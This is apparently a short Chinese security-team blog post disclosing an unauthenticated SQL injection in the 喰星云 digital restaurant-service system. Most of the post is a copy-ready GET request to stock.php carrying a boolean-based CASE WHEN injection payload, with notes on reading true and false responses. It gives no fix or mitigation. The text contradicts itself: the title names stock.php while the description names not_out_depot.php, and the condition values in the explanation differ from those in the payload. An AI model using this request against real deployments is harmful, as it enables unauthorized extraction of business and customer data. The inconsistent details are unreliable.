#  喰星云-数字化餐饮服务系统stock.php存在SQL注入漏洞   
原创 R0seK1ller  蟹堡安全团队   2024-08-04 20:27  
  
## 1. 漏洞描述  
  
	  
喰星云-数字化餐饮服务系统 not_out_depot.php接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息.  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWrFTFHpA6V6uC9KEmlEAqk1JGkIqBeC8Bibx7BAEvWicFLp20FkUibUIVM2wF87jusNWf5svnYiaDg8g/640?wx_fmt=png&from=appmsg "")  
## 2. 漏洞复现  
```
GET /logistics/home_warning/php/stock.php?do=getList&lsid=%28SELECT+%28CASE+WHEN+%289764%3D9765%29+THEN+%27%27+ELSE+%28SELECT+7700+UNION+SELECT+3389%29+END%29%29 HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate


```  
  
    报错注入，当条件WHEN+(6192=6193)不符合时，返回空内容：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWrFTFHpA6V6uC9KEmlEAqk27MicbQ2vaGSw3Xdw1nqiaKqf4dOcla9nPQv5lLjksS1o2hokYvNGia4g/640?wx_fmt=png&from=appmsg "")  
  
    报错注入，当条件WHEN+(6193=6193)符合时，返回查询数据：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWrFTFHpA6V6uC9KEmlEAqkCWbmArwUcFeAJc5mQ1kPXb7mn1DiaAu8ia9sR0xm2sFL7AmQQBic0IRkw/640?wx_fmt=png&from=appmsg "")  
  
  
